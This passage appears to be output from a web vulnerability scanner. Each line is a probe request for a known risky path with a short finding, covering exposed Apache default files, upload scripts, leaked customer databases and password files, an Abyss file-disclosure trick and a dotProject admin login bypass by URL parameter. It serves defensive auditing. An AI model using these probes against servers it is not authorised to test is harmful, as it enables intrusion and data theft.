++ -3233: GET /index.html.nn: /index.html.nn: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.pt: /index.html.pt: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.tw.Big5: /index.html.tw.Big5: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /index.html.var: /index.html.var: Apache default foreign language file found. All default files should be removed from the web server as they may give an attacker additional system information.
++ -3233: GET /a/: /a/: May be Kebi Web Mail administration menu.
++ -3282: GET /uploader.php: /uploader.php: This script may allow arbitrary files to be uploaded to the remote server.
++ -3286: GET /conspass.chl+: /conspass.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. CVE-2002-1081
++ -3286: GET /general.chl+: /general.chl+: Abyss allows hidden/protected files to be served if a + is added to the request. CVE-2002-1081
++ -3396: GET /mlog.html: /mlog.html: Remote file read vulnerability 1999-0068
++ -3396: GET /mlog.phtml: /mlog.phtml: Remote file read vulnerability 1999-0068
++ -3396: GET /php/mlog.phtml: /php/mlog.phtml: Remote file read vulnerability 1999-0346
++ -3489: GET /surf/scwebusers: /surf/scwebusers: SurfControl SuperScout Web Reports Server user and password file is available. CVE-2002-0705.
++ -3501: GET /_private/form_results.htm: /_private/form_results.htm: This file may contain information submitted by other web users via forms. CVE-1999-1052.
++ -3501: GET /_private/form_results.txt: /_private/form_results.txt: This file may contain information submitted by other web users via forms. CVE-1999-1052.
++ -3591: GET /project/index.php?m=projects&user_cookie=1: /project/index.php?m=projects&user_cookie=1: dotProject 0.2.1.5 may allow admin login bypass by adding the user_cookie=1 to the URL.
++ -379: GET /site/eg/source.asp: /site/eg/source.asp: This ASP (installed with Apache::ASP) allows attackers to upload files to the server. Upgrade to 1.95 or higher. CVE-2000-0628.
++ -4013: GET /isqlplus: /isqlplus: Oracle iSQL*Plus is installed. This may be vulnerable to a buffer overflow in the user ID field. http://www.ngssoftware.com/advisories/ora-isqlplus.txt
++ -4161: GET /data/member_log.txt: /data/member_log.txt: Teekai's forum full 1.2 member's log can be retrieved remotely.
++ -4171: GET /ASP/cart/database/metacart.mdb: /ASP/cart/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web.
++ -4171: GET /mcartfree/database/metacart.mdb: /mcartfree/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web.
++ -4171: GET /shop/database/metacart.mdb: /shop/database/metacart.mdb: MetaCart2 is an ASP shopping cart. The database of customers is available via the web.
++ -4237: GET /ban.dat: /ban.dat: Bannermatic versions 1-3 reveal sensitive information from unprotected files. These files should be protected.
++ -4239: GET /admin/datasource.asp: /admin/datasource.asp: Xpede page reveals SQL account name. The /admin directory should be protected.
++ -4361: GET /acart2_0/admin/category.asp: /acart2_0/admin/category.asp: Alan Ward A-Cart 2.0 is vulnerable to an XSS attack which may cause the administrator to delete database information.
++ -474: GET /Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp: /Sites/Knowledge/Membership/Inspiredtutorial/ViewCode.asp: The defau
